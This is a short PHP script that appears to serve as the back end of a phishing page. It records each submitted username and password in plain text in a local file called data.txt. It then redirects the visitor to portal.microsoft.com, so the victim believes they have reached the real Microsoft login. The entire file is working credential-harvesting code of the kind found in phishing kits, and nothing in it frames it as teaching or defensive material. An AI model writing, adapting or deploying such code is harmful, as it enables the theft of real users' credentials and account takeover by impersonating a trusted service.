<?php

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $name = $_POST["username"];
    $password = $_POST["password"];
    
    // Open the file for appending
    $file = fopen("data.txt", "a");
    
    // Append the data to the file
    fwrite($file, "Username: " . $name . ", ");
    fwrite($file, "Password: " . $password . "\n");
    
    // Close the file
    fclose($file);
    
    // Redirect back to the form page or a thank you page
	header("Location: https://portal.microsoft.com");
    exit;
} else {
    echo "Invalid request.";
}
?>


